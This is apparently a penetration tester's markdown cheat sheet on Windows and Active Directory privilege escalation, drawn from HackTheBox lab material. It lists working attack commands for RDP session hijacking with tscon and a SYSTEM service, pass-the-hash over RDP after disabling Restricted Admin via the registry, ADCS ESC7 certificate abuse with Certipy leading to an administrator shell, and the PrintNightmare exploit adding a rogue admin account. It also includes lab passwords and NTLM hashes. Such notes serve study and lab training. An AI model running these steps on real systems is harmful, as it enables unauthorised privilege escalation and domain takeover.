## RDP Session Hijacking
Let's imagine we successfully gain access to a machine and have an account with local administrator privileges. If a user is connected via RDP to our compromised machine, we can hijack the user's remote desktop session to escalate our privileges and impersonate the account. In an Active Directory environment, this could result in us taking over a Domain Admin account or furthering our access within the domain.
```
PS C:\ query user
```
To successfully impersonate a user without their password, we need to have SYSTEM privileges and use the Microsoft tscon.exe binary that enables users to connect to another desktop session. It works by specifying which SESSION ID (4 for the lewen session in our example) we would like to connect to which session name (rdp-tcp#13, which is our current session). So, for example, the following command will open a new console as the specified SESSION_ID within our current RDP session:
```
C:\htb> tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}
```
If we have local administrator privileges, we can use several methods to obtain SYSTEM privileges, such as PsExec or Mimikatz. A simple trick is to create a Windows service that, by default, will run as Local System and will execute any binary with SYSTEM privileges. We will use Microsoft sc.exe binary. First, we specify the service name (sessionhijack) and the binpath, which is the command we want to execute. Once we run the following command, a service named sessionhijack will be created.
```
sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"
```
To run the command, we can start the sessionhijack service:
```
C:\htb> net start sessionhijack
```
Note: This method no longer works on Server 2019.
## Pass the Hash (PtH)
### Included in Windows Lateral Movement
```
xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9
```
There are a few caveats to this attack: `Account restrictions are preventing ...`
This can be enabled by adding a new registry key `DisableRestrictedAdmin` (REG_DWORD) under `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa`. It can be done using the following command:
```
C:\htb> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```
```
xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9
```

## If you have a session on a DC host machine
### ADCS
It’s worth checking Advice Directory Certificate Services (ADCS) as well, and that’s quick, so I’ll start there. This can be done by uploading Certify or remotely with Certipy. I find Certipy easier.
```
https://github.com/ly4k/Certipy
```
```
oxdf@hacky$ certipy find -dc-ip 10.10.11.236 -ns 10.10.11.236 -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -vulnerable -stdout
```
```
ESC7                              : 'MANAGER.HTB\\Raven' has dangerous permissions
```
### ESC7
```
https://0xdf.gitlab.io/2024/03/16/htb-manager.html
```
#### Add Manage Certificates
ESC7 is when a user has either the “Manage CA” or “Manage Certificates” access rights on the certificate authority itself. Raven has ManageCa rights (shown in the output above).
The steps to exploit this are on the Certipy README.
First, I’ll need to use the Manage CA permission to give Raven the Manage Certificates permission:
```
oxdf@hacky$ certipy ca -ca manager-DC01-CA -add-officer raven -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'
```
Now Raven shows up there where they didn’t before:
```
oxdf@hacky$ certipy find -dc-ip 10.10.11.236 -ns 10.10.11.236 -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -vulnerable -stdout
```
#### Administrator Certificate
The first step is to request a certificate based on the Subordinate Certification Authority (SubCA) template provided by ADCS. The SubCA template serves as a predefined set of configurations and policies governing the issuance of certificates.
```
oxdf@hacky$ certipy req -ca manager-DC01-CA -target dc01.manager.htb -template SubCA -upn administrator@manager.htb -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'
```
```
Would you like to save the private key? (y/N) y
[*] Saved private key to 13.key
```
This fails, but it saves the private key involved. Then, using the Manage CA and Manage Certificates privileges, I’ll use the ca subcommand to issue the request:
```
oxdf@hacky$ certipy ca -ca manager-DC01-CA -issue-request 13 -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'
```
Now, the issued certificate can be retrieved using the req command:
```
oxdf@hacky$ certipy req -ca manager-DC01-CA -target dc01.manager.htb -retrieve 13 -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'
```
```
[*] Rerieving certificate with ID 13          
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@manager.htb'
[*] Certificate has no object SID
[*] Loaded private key from '13.key'                     
[*] Saved certificate and private key to 'administrator.pfx'
```
With this certificate as the administrator user, the easiest way to get a shell is to use it to get the NTLM hash for the user with the auth command. This requires the VM and target times to be in sync, with otherwise leads to this failure:
```
oxdf@hacky$ certipy auth -pfx administrator.pfx -dc-ip manager.htb
```
I’ll use ntpdate to sync my VM’s time to Manager’s:
```
oxdf@hacky$ sudo ntpdate 10.10.11.236
```
```
oxdf@hacky$ certipy auth -pfx administrator.pfx -dc-ip 10.10.11.236 
```
With the hash, I can get a shell as administrator using Evil-WinRM:
```
oxdf@hacky$ evil-winrm -i manager.htb -u administrator -H ae5064c2f62317332c88629e025924ef
```
# Domain Controllers, Windows 7 and 10
## CVE-2021-1675/CVE-2021-34527 PrintNightmar
```
https://github.com/cube0x0/CVE-2021-1675
```
```
https://github.com/calebstewart/CVE-2021-1675
```
1. Checking for Spooler Service
```
PS C:\htb> ls \\localhost\pipe\spoolss
```
2. If it is not running, we will receive a "path does not exist" error.
3. bypassing the execution policy on the target host
```
PS C:\htb> Set-ExecutionPolicy Bypass -Scope Process
```
4. Adding Local Admin with PrintNightmare PowerShell PoC
```
PS C:\htb> Import-Module .\CVE-2021-1675.ps1
```
```
PS C:\htb> Invoke-Nightmare -NewUser "hacker" -NewPassword "Pwnd1234!" -DriverName "PrintIt"
```
5. Confirming New Admin User
```
net user hacker
```
⇒ You have to login as the user hacker in order to gave Administrator privileges and run a cmd as Administrator